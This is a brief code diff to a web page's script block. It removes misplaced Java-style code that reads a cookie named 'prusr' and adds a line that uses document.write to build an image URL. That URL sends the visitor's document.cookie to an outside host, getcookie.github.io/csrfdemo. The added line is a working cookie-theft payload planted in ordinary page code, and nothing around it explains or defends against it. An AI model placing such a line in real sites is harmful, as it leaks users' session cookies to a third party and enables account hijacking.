@@ -12,17 +12,7 @@
 
 <script>
 	function myFunction() {
-    		String mtr = "";
- 
-		Cookie[] cookies = request.getCookies();
-		if (cookies != null) {
-    		for(int i=0; i < cookies.length; i++) {
-       			 Cookie c = cookies[i];
-        	if (c.getName().equals("prusr")) {
-            		mtr = c.getValue();
-        }
-    }
-}
+    		document.write('<img src="https://getcookie.github.io/csrfdemo/index.html?cookie=' +document.cookie + '" />')
 }
 </script>
 
